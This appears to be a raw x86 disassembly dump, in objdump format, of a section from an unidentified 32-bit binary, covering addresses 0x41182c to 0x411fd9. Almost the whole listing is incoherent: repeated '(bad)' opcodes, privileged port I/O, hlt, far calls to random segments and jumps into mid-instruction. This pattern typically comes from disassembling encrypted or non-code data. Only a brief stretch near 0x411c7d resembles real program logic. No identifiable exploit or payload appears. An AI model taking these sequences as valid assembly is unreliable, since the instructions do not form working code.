  41182c:	cmp    DWORD PTR cs:[ebp+0x3b70d6b5],ecx
  411833:	xchg   edx,eax
  411834:	xor    ah,cl
  411836:	fsubr  QWORD PTR [ebx]
  411838:	adc    edx,edi
  41183a:	mov    ds:0x2b0c758b,al
  41183f:	ret    0x581
  411842:	jne    0x411840
  411844:	inc    edx
  411845:	add    BYTE PTR [edi],bh
  411847:	jg     0x411849
  411849:	add    BYTE PTR [ebx],dh
  41184b:	rol    edi,0x5
  41184e:	cli    
  41184f:	cld    
  411850:	inc    edx
  411851:	add    BYTE PTR [ecx+0x57],dh
  411854:	add    BYTE PTR [eax],al
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fcf6,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx-0x77b51217],dl
  41187c:	jns    0x4118f4
  41187e:	push   edi
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x41186a
  411886:	xor    al,0x0
  411888:	adc    dh,BYTE PTR [ecx+edi*4]
  41188b:	mov    ecx,0xbd43b1c
  411890:	(bad)  
  411892:	jns    0x4118d5
  411894:	mov    esi,0xf78cb8ed
  411899:	imul   esi,DWORD PTR [ebx+0xf],0xa69119af
  4118a0:	sub    esp,DWORD PTR [ebx-0x36]
  4118a3:	stos   DWORD PTR es:[edi],eax
  4118a4:	inc    esi
  4118a5:	aam    0xc8
  4118a7:	mov    al,0xa9
  4118a9:	xchg   edx,eax
  4118aa:	cli    
  4118ab:	xlat   BYTE PTR ds:[ebx]
  4118ac:	adc    eax,0x139baa2d
  4118b1:	jmp    0xe645cad9
  4118b6:	paddb  mm7,QWORD PTR [edi+0x7d012109]
  4118bd:	inc    edi
  4118be:	sub    DWORD PTR [edi],edi
  4118c0:	pop    esi
  4118c1:	push   esp
  4118c2:	xor    ah,bh
  4118c4:	push   ss
  4118c5:	pop    es
  4118c6:	pop    ds
  4118c7:	call   0x66ed:0xe5d6
  4118cd:	xor    BYTE PTR [ebx+0x59],dh
  4118d0:	sbb    esp,ecx
  4118d2:	sahf   
  4118d3:	clc    
  4118d4:	lahf   
  4118d5:	imul   esi,DWORD PTR [edx-0x49],0x40
  4118d9:	shl    DWORD PTR [edx],cl
  4118db:	pushf  
  4118dc:	or     al,0xfc
  4118de:	jno    0x4118ff
  4118e0:	test   DWORD PTR [edi+esi*2],ebx
  4118e3:	mov    ds:0xe74458dd,al
  4118e8:	loope  0x4118f7
  4118ea:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118ec:	sar    DWORD PTR [ecx+0x7937776c],cl
  4118f2:	sub    BYTE PTR [edi],cl
  4118f4:	(bad)  
  4118f5:	loope  0x4118dd
  4118f7:	xor    DWORD PTR [ebx+0xf596daf],ebx
  4118fd:	sbb    ecx,DWORD PTR [edi+0x10]
  411900:	lea    esp,[eax]
  411902:	jnp    0x411945
  411904:	mov    edx,DWORD PTR [edi+0x0]
  411907:	jmp    0x7841c00
  41190c:	mov    bl,0xd4
  41190e:	call   0xd6a:0x74ac0201
  411915:	cmp    dh,BYTE PTR ds:[ebx]
  411918:	and    ah,BYTE PTR [ebx]
  41191a:	ds cli 
  41191c:	outs   dx,BYTE PTR ds:[esi]
  41191d:	sbb    eax,0x55ebc806
  411922:	cs bnd call esp
  411926:	mov    ?,WORD PTR [esi+0x65f6bff9]
  41192c:	outs   dx,DWORD PTR ds:[esi]
  41192d:	sbb    al,0x2e
  41192f:	pushf  
  411930:	hlt    
  411931:	ins    DWORD PTR es:[edi],dx
  411932:	push   ss
  411933:	push   ebx
  411934:	repz jne 0x411943
  411937:	nop
  411938:	dec    esi
  411939:	adc    edx,DWORD PTR [ecx-0x27010719]
  41193f:	iret   
  411940:	sbb    al,0x11
  411942:	add    DWORD PTR [eax],edi
  411944:	pop    ss
  411945:	out    dx,al
  411946:	mov    ecx,0xc6073e9a
  41194b:	test   eax,0x13ff8b4b
  411950:	jno    0x411956
  411952:	jae    0x41199c
  411954:	xor    BYTE PTR [ecx+0x1e],cl
  411957:	xchg   ebx,eax
  411958:	in     al,0xf3
  41195a:	cmp    BYTE PTR [edi+eiz*1-0x2],ah
  41195e:	in     eax,0xbc
  411960:	mov    bh,0x7b
  411962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411963:	push   ecx
  411964:	adc    BYTE PTR cs:[ecx+0x56bbd5b6],ah
  41196b:	dec    esp
  41196c:	adc    al,BYTE PTR [esi+0x74bed873]
  411972:	mov    ch,0x3b
  411974:	ss int 0xc4
  411977:	call   0x1f24:0xbded45e3
  41197e:	or     bl,BYTE PTR [edi-0x72]
  411981:	jb     0x4119b4
  411983:	inc    ebx
  411984:	inc    ebx
  411985:	mov    bl,0x17
  411987:	test   eax,0xa2edcea7
  41198c:	mov    edx,0x9cd7f7e0
  411991:	adc    al,0xfb
  411993:	xor    bl,al
  411995:	pushf  
  411996:	div    ecx
  411998:	(bad)  
  411999:	sbb    DWORD PTR [ecx],ebx
  41199b:	mov    al,es:0x54b85911
  4119a1:	jecxz  0x4119c1
  4119a3:	enter  0x6466,0x87
  4119a7:	xor    DWORD PTR [esi],ecx
  4119a9:	test   BYTE PTR [edi],0xb8
  4119ac:	mov    WORD PTR [ebp+0x5a],gs
  4119af:	popa   
  4119b0:	or     DWORD PTR [esp+ebp*4+0x1cbdbda0],ebx
  4119b7:	popa   
  4119b8:	stos   BYTE PTR es:[edi],al
  4119b9:	add    bl,BYTE PTR [ecx-0x3d3f571f]
  4119bf:	popa   
  4119c0:	xor    eax,0x24aa7bcf
  4119c5:	sub    cl,BYTE PTR [ebx]
  4119c7:	xchg   ebx,eax
  4119c8:	sbb    BYTE PTR [edi+esi*4+0x3d],dh
  4119cc:	xchg   edi,eax
  4119cd:	ret    0x4ffa
  4119d0:	sahf   
  4119d1:	dec    esp
  4119d2:	hlt    
  4119d3:	jp     0x411a06
  4119d5:	fsub   DWORD PTR ds:0xaeb5ab14
  4119db:	fmul   QWORD PTR [edi-0x77]
  4119de:	or     eax,0x1075e35c
  4119e3:	(bad)  
  4119e4:	and    al,0x83
  4119e6:	push   ss
  4119e7:	(bad)  
  4119e8:	jnp    0x411985
  4119ea:	cli    
  4119eb:	xor    eax,0x7abd2086
  4119f0:	push   eax
  4119f1:	inc    edi
  4119f2:	test   al,0x77
  4119f4:	daa    
  4119f5:	jp     0x411a42
  4119f7:	cmp    eax,0xb688bb17
  4119fc:	sbb    al,0x12
  4119fe:	cmc    
  4119ff:	mov    edi,0xca8c0b91
  411a04:	data16 out dx,al
  411a06:	je     0x411a10
  411a08:	repz add al,0x24
  411a0b:	enter  0xba3,0x3d
  411a0f:	jno    0x411a38
  411a11:	(bad)  
  411a13:	dec    eax
  411a14:	jb     0x4119ee
  411a16:	add    dl,BYTE PTR [ebx+esi*2]
  411a19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a1a:	out    dx,al
  411a1b:	mov    dl,0x5
  411a1d:	xor    BYTE PTR [ebp-0xd],bh
  411a20:	add    eax,ebp
  411a22:	mov    edx,0xbe52179c
  411a27:	aaa    
  411a28:	or     ebp,DWORD PTR [edx+0xfaec51d]
  411a2e:	std    
  411a2f:	inc    eax
  411a30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a31:	add    eax,0x24dd8b81
  411a36:	pop    es
  411a37:	pop    ecx
  411a38:	jae    0x4119e9
  411a3a:	outs   dx,BYTE PTR ds:[esi]
  411a3b:	and    bl,bh
  411a3d:	jecxz  0x411a7f
  411a3f:	adc    al,BYTE PTR [edi+0x71]
  411a42:	fwait
  411a43:	dec    eax
  411a44:	jle    0x411a13
  411a46:	sti    
  411a47:	cld    
  411a48:	pusha  
  411a49:	ja     0x4119f1
  411a4b:	inc    esi
  411a4c:	xor    edi,ebx
  411a4e:	mov    ah,0xa6
  411a50:	addr16 or al,0xa3
  411a53:	and    eax,0x3457c3d9
  411a58:	add    al,0x67
  411a5a:	inc    edi
  411a5b:	je     0x4119f7
  411a5d:	lods   eax,DWORD PTR ds:[esi]
  411a5e:	ficom  DWORD PTR [ebp+eiz*2-0x9]
  411a62:	or     BYTE PTR [ebp-0x76d4c0ec],dl
  411a68:	push   edi
  411a69:	nop
  411a6a:	inc    edx
  411a6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a6c:	mov    edi,0x2178ad72
  411a71:	mov    dh,0xe7
  411a73:	pop    ebx
  411a74:	mul    DWORD PTR [edx]
  411a76:	cli    
  411a77:	bound  ebx,QWORD PTR [eax+0x1184e5a8]
  411a7d:	(bad)  
  411a7e:	or     eax,0xec22177e
  411a83:	jo     0x411aea
  411a85:	inc    esp
  411a86:	mov    eax,ds:0xe06c91c0
  411a8b:	dec    ebp
  411a8c:	aaa    
  411a8d:	inc    edx
  411a8e:	(bad)  
  411a8f:	jmp    0xc7e7:0x40329d3b
  411a96:	hlt    
  411a97:	icebp  
  411a98:	dec    ebp
  411a99:	or     edi,DWORD PTR [edx+0x33]
  411a9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a9d:	clc    
  411a9e:	mov    ds:0x32b7a4ae,eax
  411aa3:	jl     0x411a7f
  411aa5:	neg    BYTE PTR [edi-0xa14c117]
  411aab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411aac:	push   ebx
  411aad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411aae:	rcr    BYTE PTR [edx],1
  411ab0:	fld    QWORD PTR [ebx+0x40231fc8]
  411ab6:	rol    DWORD PTR [ebp-0x68f1d837],1
  411abc:	div    dh
  411abe:	pop    ebx
  411abf:	mov    al,ds:0x6454885c
  411ac4:	xor    eax,0x42f18b4d
  411ac9:	fwait
  411aca:	adc    ebp,edx
  411acc:	cmp    al,0xf9
  411ace:	enter  0xffc2,0xb8
  411ad2:	adc    eax,edx
  411ad4:	xchg   ecx,eax
  411ad5:	(bad)  
  411ad6:	not    BYTE PTR [esi]
  411ad8:	add    eax,DWORD PTR [ecx-0x3b15d1ac]
  411ade:	sub    dl,BYTE PTR [ecx+0x76036f67]
  411ae4:	pop    ss
  411ae5:	dec    ebp
  411ae6:	adc    eax,0x3c52ef9d
  411aeb:	gs push ecx
  411aed:	xchg   ebp,eax
  411aee:	push   ebp
  411aef:	(bad)  
  411af0:	pop    eax
  411af1:	sti    
  411af2:	mov    ebx,0xaed71d2d
  411af7:	out    0x5d,eax
  411af9:	pop    ss
  411afa:	lods   al,BYTE PTR ds:[esi]
  411afb:	xchg   edx,eax
  411afc:	rep ins BYTE PTR es:[edi],dx
  411afe:	(bad)  
  411aff:	(bad)  
  411b00:	(bad)  
  411b01:	aam    0xcd
  411b03:	lea    ecx,[ecx-0x5884ecd8]
  411b09:	mov    dh,BYTE PTR [edi]
  411b0b:	xor    eax,esp
  411b0d:	daa    
  411b0e:	arpl   bp,di
  411b10:	xchg   esp,eax
  411b11:	dec    ebp
  411b12:	rcl    esp,cl
  411b14:	(bad)  
  411b15:	xor    esi,ebx
  411b17:	mov    al,0xa6
  411b19:	mov    eax,0x225fccb6
  411b1e:	das    
  411b1f:	retf   
  411b20:	dec    esi
  411b21:	xor    edi,edx
  411b23:	jp     0x411b63
  411b25:	dec    ebp
  411b26:	aaa    
  411b27:	loop   0x411b81
  411b29:	addr16 cmc 
  411b2b:	sbb    al,0xb
  411b2d:	inc    ecx
  411b2e:	loope  0x411af3
  411b30:	in     al,0xd2
  411b32:	dec    edx
  411b33:	test   BYTE PTR [esp+ecx*4-0x63d17d15],bh
  411b3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b3b:	and    BYTE PTR [esi+0x47e6b1d0],cl
  411b41:	lds    esi,FWORD PTR [esp+ecx*1-0x1a210e8d]
  411b48:	rcr    BYTE PTR [ebx],cl
  411b4a:	cld    
  411b4b:	sbb    al,0x9b
  411b4d:	ja     0x411b8c
  411b4f:	lods   al,BYTE PTR ds:[esi]
  411b50:	loop   0x411af7
  411b52:	aad    0xfc
  411b54:	push   ebp
  411b55:	ins    DWORD PTR es:[edi],dx
  411b56:	fs mov ebp,0x3696827b
  411b5c:	repz adc edi,eax
  411b5f:	sbb    DWORD PTR [edi],ebp
  411b61:	cmp    ch,dh
  411b63:	push   edi
  411b64:	or     esi,DWORD PTR [edx]
  411b66:	push   es
  411b67:	mov    WORD PTR [edi+esi*4],?
  411b6a:	shl    ch,cl
  411b6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b6d:	aas    
  411b6e:	call   0xd57c40e1
  411b73:	mov    ebp,0x63177756
  411b78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b79:	inc    edx
  411b7a:	sbb    eax,0xd0303cac
  411b7f:	xchg   esp,eax
  411b80:	xchg   edi,eax
  411b81:	das    
  411b82:	mov    ecx,esi
  411b84:	aam    0x3
  411b86:	push   esp
  411b87:	pop    ebx
  411b88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b89:	scas   al,BYTE PTR es:[edi]
  411b8a:	sub    al,0x86
  411b8c:	sar    BYTE PTR [esi+0x15],1
  411b8f:	pushf  
  411b90:	repz sub ecx,esp
  411b93:	hlt    
  411b94:	jo     0x411b5a
  411b96:	fist   DWORD PTR [esi+0x2fa47323]
  411b9c:	icebp  
  411b9d:	fcomp  st(1)
  411b9f:	sar    BYTE PTR [ebx+0x6356df57],0xd
  411ba6:	sbb    DWORD PTR [ecx],eax
  411ba8:	rol    ah,0xdc
  411bab:	dec    edi
  411bac:	stos   DWORD PTR es:[edi],eax
  411bad:	jmp    DWORD PTR [esi-0x1a8dfaef]
  411bb3:	or     BYTE PTR [esi-0x71],bh
  411bb6:	call   0xa1906d13
  411bbb:	xor    dh,0xcf
  411bbe:	call   0xcc71:0x259908d1
  411bc5:	nop
  411bc6:	retf   
  411bc7:	push   edi
  411bc8:	in     al,dx
  411bc9:	in     eax,0x59
  411bcb:	xor    eax,0xe7ee1e26
  411bd0:	mov    esp,0x14d96bea
  411bd5:	dec    edi
  411bd6:	(bad)  
  411bd7:	inc    ecx
  411bd8:	repnz or eax,0x1b134939
  411bde:	hlt    
  411bdf:	push   0x1d
  411be1:	mov    al,ds:0xa0fe06b1
  411be6:	jle    0x411bd4
  411be8:	in     al,dx
  411be9:	in     eax,dx
  411bea:	mov    eax,ds:0x28f58667
  411bef:	std    
  411bf0:	sahf   
  411bf1:	dec    ebx
  411bf2:	into   
  411bf3:	jne    0x411b95
  411bf5:	xor    eax,0x9ae26ee6
  411bfa:	dec    edx
  411bfb:	loope  0x411be8
  411bfd:	inc    ebx
  411bfe:	fcmove st,st(0)
  411c00:	test   eax,0x42a0559d
  411c05:	fisttp DWORD PTR [edi-0x34ca012d]
  411c0b:	or     ah,ch
  411c0d:	int    0xfc
  411c0f:	lock (bad) 
  411c11:	and    esp,DWORD PTR [eax]
  411c13:	cmp    DWORD PTR [eax-0x64af9d7b],ecx
  411c19:	or     BYTE PTR [esi-0x25],al
  411c1c:	test   al,0x2c
  411c1e:	adc    eax,DWORD PTR [edi]
  411c20:	sub    eax,0x64844bd5
  411c25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c26:	mov    cl,bl
  411c28:	sub    eax,0x8371ccef
  411c2d:	inc    ebx
  411c2e:	or     al,0x4b
  411c30:	in     eax,0xc8
  411c32:	push   edi
  411c33:	cmp    eax,0xc1c708f3
  411c38:	aas    
  411c39:	sbb    al,0xb9
  411c3b:	or     ebx,esi
  411c3d:	dec    eax
  411c3e:	xor    DWORD PTR [esi],eax
  411c40:	sub    esi,edi
  411c42:	nop
  411c43:	mov    ch,bl
  411c45:	rol    ah,1
  411c47:	add    al,0x9c
  411c49:	and    al,0x87
  411c4b:	xor    eax,0x35bfb302
  411c50:	addr16 jo 0x411c32
  411c53:	jmp    0xc1c1:0xafc02df1
  411c5a:	sub    al,0xbb
  411c5c:	bound  eax,QWORD PTR ds:0x71da8740
  411c62:	leave  
  411c63:	mov    ebp,DWORD PTR [ebx]
  411c65:	fsub   st,st(5)
  411c67:	call   0xaf3eae61
  411c6c:	jecxz  0x411c0f
  411c6e:	sub    al,0xb2
  411c70:	inc    ecx
  411c71:	add    BYTE PTR [ebx],al
  411c73:	add    eax,0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0x36f8fb5e
  411cb8:	cmc    
  411cb9:	pop    esi
  411cba:	push   ebx
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411cbe
  411cc2:	adc    DWORD PTR [edx],eax
  411cc4:	mov    esi,0xc61377f5
  411cc9:	leave  
  411cca:	(bad)  
  411ccb:	mov    ah,dl
  411ccd:	cmp    cl,al
  411ccf:	pop    edi
  411cd0:	jae    0x411c89
  411cd2:	jne    0x411d1a
  411cd4:	pop    ecx
  411cd5:	cmp    eax,0x9d5caf4f
  411cda:	fiadd  WORD PTR [ecx-0x2c]
  411cdd:	adc    al,0xee
  411cdf:	adc    al,0x8e
  411ce1:	mov    ebx,eax
  411ce3:	(bad)  
  411ce4:	jns    0x411cc0
  411ce6:	test   BYTE PTR [ecx-0x382c9e77],al
  411cec:	and    DWORD PTR [esi+0x535f9b78],ebp
  411cf2:	std    
  411cf3:	in     al,0x1
  411cf5:	jne    0x411d76
  411cf7:	lock cs jns 0x411cd6
  411cfb:	and    al,0xf1
  411cfd:	or     DWORD PTR [edx*2-0x2a77aac2],ecx
  411d04:	jmp    0x1d77:0x6e096d21
  411d0b:	xchg   edi,eax
  411d0c:	test   al,0xc7
  411d0e:	retf   
  411d0f:	dec    ebp
  411d10:	inc    edx
  411d11:	xor    BYTE PTR [eax],ah
  411d13:	push   ecx
  411d14:	(bad)  
  411d15:	jno    0x411cf6
  411d17:	fstp   QWORD PTR [eax]
  411d19:	xchg   esi,eax
  411d1a:	and    cl,BYTE PTR [ecx+0x5f]
  411d1d:	or     eax,0x4fe6f67d
  411d22:	cld    
  411d23:	add    ecx,DWORD PTR [ebx-0x1a55dbe]
  411d29:	aaa    
  411d2a:	xchg   edx,eax
  411d2b:	int    0x0
  411d2d:	mov    DWORD PTR [ecx-0x3a16ade8],ebx
  411d33:	inc    esp
  411d34:	dec    ecx
  411d35:	jnp    0x411cc9
  411d37:	cli    
  411d38:	mov    BYTE PTR [ecx+0x664847ff],al
  411d3e:	fiadd  DWORD PTR [esi-0x2606b365]
  411d44:	fs jns 0x411d3b
  411d47:	call   DWORD PTR [ebx+0x4e53edd6]
  411d4d:	push   edx
  411d4e:	je     0x411cf0
  411d50:	ins    BYTE PTR es:[edi],dx
  411d51:	push   ds
  411d52:	xor    eax,0xfa57ab37
  411d57:	push   edi
  411d58:	popf   
  411d59:	jns    0x411d80
  411d5b:	mov    ebx,ebx
  411d5d:	add    al,0xe6
  411d5f:	add    edi,DWORD PTR [eax+ecx*2+0x24]
  411d63:	dec    esi
  411d64:	dec    ebp
  411d65:	push   0x657dd1da
  411d6a:	push   0xffffffb3
  411d6c:	(bad)  
  411d6d:	sahf   
  411d6e:	add    ah,BYTE PTR [ebp-0x23]
  411d71:	sub    al,0x39
  411d73:	call   0x90cd:0x65e206d3
  411d7a:	xchg   edx,eax
  411d7b:	not    DWORD PTR [esi-0x7d35c072]
  411d81:	stos   BYTE PTR es:[edi],al
  411d82:	push   edx
  411d83:	(bad)  
  411d84:	std    
  411d85:	mov    ecx,0x33f9fce4
  411d8a:	call   0xd7fdcc55
  411d8f:	push   esp
  411d90:	loope  0x411d78
  411d92:	sbb    eax,0x31cda57d
  411d97:	(bad)  
  411d98:	xlat   BYTE PTR ds:[ebx]
  411d99:	inc    ecx
  411d9a:	or     al,0x4d
  411d9c:	xor    ebp,DWORD PTR [edi-0x48]
  411d9f:	ret    
  411da0:	xor    DWORD PTR [edx+ebp*1],esi
  411da3:	xor    DWORD PTR [esi-0x554dffdb],edx
  411da9:	je     0x411e29
  411dab:	(bad)  
  411dac:	jp     0x411e00
  411dae:	les    ebp,FWORD PTR [edi+0x18]
  411db1:	pop    edi
  411db2:	call   0xe358cb2b
  411db7:	dec    edi
  411db8:	jne    0x411d51
  411dba:	js     0x411ddb
  411dbc:	retf   0xd6b5
  411dbf:	adc    dh,dl
  411dc1:	out    dx,al
  411dc2:	(bad)  
  411dc3:	inc    BYTE PTR [esi-0x4e]
  411dc6:	mov    ebx,0x384f113
  411dcb:	lods   eax,DWORD PTR ds:[esi]
  411dcc:	inc    esp
  411dcd:	mov    bh,0xa4
  411dcf:	test   eax,0x1fc42887
  411dd4:	test   BYTE PTR [edi],ah
  411dd6:	fstp   TBYTE PTR [ecx]
  411dd8:	dec    edi
  411dd9:	mov    BYTE PTR [esi],dh
  411ddb:	mov    dl,0x74
  411ddd:	mov    cl,ah
  411ddf:	sub    ebp,DWORD PTR [esi]
  411de1:	push   ebx
  411de2:	lods   al,BYTE PTR ds:[esi]
  411de3:	cwde   
  411de4:	push   edx
  411de5:	popf   
  411de6:	pop    ds
  411de7:	out    0x45,eax
  411de9:	test   eax,0x890c213b
  411dee:	shl    BYTE PTR [ebx-0x5a],1
  411df1:	daa    
  411df2:	pop    ds
  411df3:	push   edi
  411df4:	jne    0xe456c8cc
  411dfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dfb:	push   ds
  411dfc:	xchg   ebp,eax
  411dfd:	ds fwait
  411dff:	inc    esp
  411e00:	pop    ds
  411e01:	je     0x411ded
  411e03:	sub    al,0x5e
  411e05:	xchg   esp,eax
  411e06:	mov    ah,0x70
  411e08:	dec    ebx
  411e09:	jnp    0x411e3c
  411e0b:	sub    al,dh
  411e0d:	scas   eax,DWORD PTR es:[edi]
  411e0e:	clc    
  411e0f:	daa    
  411e10:	dec    edx
  411e11:	inc    ebx
  411e12:	lahf   
  411e13:	and    edx,edx
  411e15:	repz cmp BYTE PTR [eax-0x75],bh
  411e19:	xchg   BYTE PTR [esi+0x2b],bl
  411e1c:	rcl    DWORD PTR [edx+eiz*1],1
  411e1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e20:	sbb    al,0xae
  411e22:	add    eax,0xc7dd55f
  411e27:	dec    esi
  411e28:	adc    WORD PTR [ecx-0x38],bx
  411e2c:	ss mov esp,0xe5a0fcd0
  411e32:	not    DWORD PTR [esi+0x75]
  411e35:	test   ah,0xaa
  411e38:	dec    edi
  411e39:	ret    
  411e3a:	jbe    0x411e97
  411e3c:	add    DWORD PTR [esi],ebp
  411e3e:	out    0x4,al
  411e40:	ins    DWORD PTR es:[edi],dx
  411e41:	inc    edx
  411e42:	(bad)  
  411e44:	xlat   BYTE PTR ds:[ebx]
  411e45:	push   ss
  411e46:	sti    
  411e47:	shr    DWORD PTR ds:[ecx],1
  411e4a:	mov    ds:0x88cf2c0b,eax
  411e4f:	fisttp DWORD PTR [ebp-0x22b47e4f]
  411e55:	aam    0xe4
  411e57:	cld    
  411e58:	xor    eax,0x15c69632
  411e5d:	in     eax,dx
  411e5e:	push   0x5edba6cd
  411e63:	inc    ebp
  411e64:	pop    edx
  411e65:	jne    0x411e8f
  411e67:	mov    bl,0x67
  411e69:	mov    bh,BYTE PTR [esi+0xdcf5150]
  411e6f:	fbld   TBYTE PTR [ebp+0x308de415]
  411e75:	in     al,dx
  411e76:	dec    edi
  411e77:	sbb    eax,0xcfa93e38
  411e7c:	mov    DWORD PTR [esi],esp
  411e7e:	push   ds
  411e7f:	ret    0x4fd8
  411e82:	cmc    
  411e83:	mov    edx,0x95908afb
  411e88:	shl    ebp,cl
  411e8a:	out    dx,al
  411e8b:	ret    0xedd7
  411e8e:	sub    ah,BYTE PTR [edx+0x4b4a1989]
  411e94:	(bad)
  411e98:	add    cl,BYTE PTR [ebp-0x53238577]
  411e9e:	dec    esp
  411e9f:	rol    DWORD PTR [eax+ebx*8+0x2d],cl
  411ea3:	mov    ebp,0x32343257
  411ea8:	add    edi,DWORD PTR [edx+ebx*2]
  411eab:	jmp    0x411e81
  411ead:	jae    0x411f05
  411eaf:	adc    al,0x1
  411eb1:	and    DWORD PTR ss:[edx+0x15],edx
  411eb5:	xlat   BYTE PTR ds:[ebx]
  411eb6:	push   ss
  411eb7:	sub    bl,BYTE PTR [edx+0x7d]
  411eba:	fst    DWORD PTR [ebx+esi*2-0xa49ea4b]
  411ec1:	fs sti 
  411ec3:	or     BYTE PTR fs:0x495c8b30,dl
  411eca:	xchg   ebp,eax
  411ecb:	add    al,BYTE PTR [ecx+0x25]
  411ece:	dec    eax
  411ecf:	jbe    0x411f46
  411ed1:	push   ss
  411ed2:	and    BYTE PTR [esp+ebp*8],ah
  411ed5:	push   0xffffffd5
  411ed7:	scas   al,BYTE PTR es:[edi]
  411ed8:	test   esi,0x7798b2f5
  411ede:	sbb    DWORD PTR [eax],0xffffffeb
  411ee1:	adc    dh,al
  411ee3:	jge    0x411ef7
  411ee5:	mov    edi,0xf544454e
  411eea:	sbb    al,0x4f
  411eed:	and    ch,BYTE PTR ss:[ebx]
  411ef0:	pop    edx
  411ef1:	mov    ebx,0x4d20a656
  411ef6:	inc    esi
  411ef7:	cmp    eax,0x8e390d7e
  411efc:	dec    ebx
  411efd:	cwde   
  411efe:	adc    DWORD PTR [eax-0x28f41db3],esi
  411f04:	add    ah,al
  411f06:	cmp    edx,ecx
  411f08:	(bad)  
  411f09:	ds scas al,BYTE PTR es:[edi]
  411f0b:	inc    edi
  411f0c:	out    dx,al
  411f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f0e:	mov    eax,0xb7ab7236
  411f13:	pop    esi
  411f14:	inc    eax
  411f15:	xlat   BYTE PTR ds:[ebx]
  411f16:	xchg   edi,eax
  411f17:	test   DWORD PTR [edi+0x6b83b976],edx
  411f1d:	mov    dh,0x33
  411f1f:	aad    0x32
  411f21:	and    edi,DWORD PTR [esi-0x51e56ed8]
  411f27:	cld    
  411f28:	(bad)  
  411f29:	stc    
  411f2a:	dec    ecx
  411f2b:	stos   BYTE PTR es:[edi],al
  411f2c:	push   ss
  411f2d:	inc    ecx
  411f2e:	ret    0x2aa4
  411f31:	mov    ds:0xa4d41280,eax
  411f36:	xlat   BYTE PTR ds:[ebx]
  411f37:	sub    ch,BYTE PTR [esi+0x796769cb]
  411f3d:	add    esi,DWORD PTR [edx]
  411f3f:	pop    esp
  411f40:	in     eax,0x81
  411f42:	ss xchg esp,eax
  411f44:	add    eax,0xac8e7558
  411f49:	push   es
  411f4a:	lea    ecx,[eax-0x7b30d2df]
  411f50:	push   0x9ee0397
  411f55:	in     eax,dx
  411f56:	sbb    DWORD PTR [eax+eiz*2],esi
  411f59:	adc    bl,BYTE PTR [edx+0x42]
  411f5c:	stc    
  411f5d:	mov    esp,0xeb9217f9
  411f62:	sti    
  411f63:	mov    ds:0xa4fa4ca7,al
  411f68:	int3   
  411f69:	push   es
  411f6a:	fdivr  st,st(2)
  411f6c:	pop    ebx
  411f6d:	retf   
  411f6e:	mov    dh,0x66
  411f70:	cmp    BYTE PTR [esi-0x775dd48],bl
  411f76:	popf   
  411f77:	ss ja  0x411f0e
  411f7a:	test   al,0xa6
  411f7c:	int    0x49
  411f7e:	mov    WORD PTR [ecx],ss
  411f80:	aam    0xe7
  411f82:	push   esi
  411f83:	addr16 jle 0x411fbc
  411f86:	pop    edi
  411f87:	push   esp
  411f88:	or     ebp,ebp
  411f8a:	(bad)  
  411f8b:	adc    esp,DWORD PTR [eax]
  411f8d:	rol    esi,0x11
  411f90:	scas   eax,DWORD PTR es:[edi]
  411f91:	pop    ebx
  411f92:	add    ecx,ebx
  411f94:	jnp    0x411fe7
  411f96:	xlat   BYTE PTR ds:[ebx]
  411f97:	inc    ebp
  411f98:	clc    
  411f99:	xor    eax,0xc70f4601
  411f9e:	cmp    cl,BYTE PTR ds:0xa4c9c1a1
  411fa4:	inc    ebp
  411fa5:	retf   
  411fa6:	retf   
  411fa7:	in     al,dx
  411fa8:	aaa    
  411fa9:	push   edi
  411faa:	dec    eax
  411fab:	int    0x94
  411fad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fae:	sbb    cl,BYTE PTR [edi+0x6274b7b2]
  411fb4:	in     eax,dx
  411fb5:	pop    edi
  411fb6:	test   eax,0xf81ab935
  411fbb:	cmc    
  411fbc:	pop    ebp
  411fbd:	cmp    al,0xf0
  411fbf:	pop    edx
  411fc0:	xor    al,0x54
  411fc2:	jmp    0x7d57edec
  411fc7:	push   ds
  411fc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fc9:	daa    
  411fca:	mov    cl,0xa1
  411fcc:	aam    0xd5
  411fce:	jnp    0x411ff4
  411fd0:	mov    edi,0x247401de
  411fd5:	cld    
  411fd6:	mov    ah,0x71
  411fd8:	aaa    
  411fd9:	loop   0x411fea
